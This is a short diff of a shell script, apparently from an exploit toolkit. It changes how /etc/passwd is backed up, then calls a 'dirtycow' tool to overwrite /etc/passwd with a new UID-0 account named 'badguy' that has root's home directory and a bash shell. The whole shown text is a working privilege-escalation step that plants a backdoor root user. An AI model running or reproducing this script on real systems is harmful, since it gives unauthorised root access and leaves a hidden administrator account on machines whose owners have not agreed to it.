@@ -4,8 +4,5 @@
 
 . "$(dirname "$0")/common.sh"
 
-backup="$HOME/passwd"
-cp /etc/passwd "$backup"
-echoerr "Backed up /etc/passwd to $backup"
-
+backup /etc/passwd "$HOME/passwd"
 dirtycow -a -s "badguy:5/tk2PeameNik:0:0:root:/root:/bin/bash" /etc/passwd
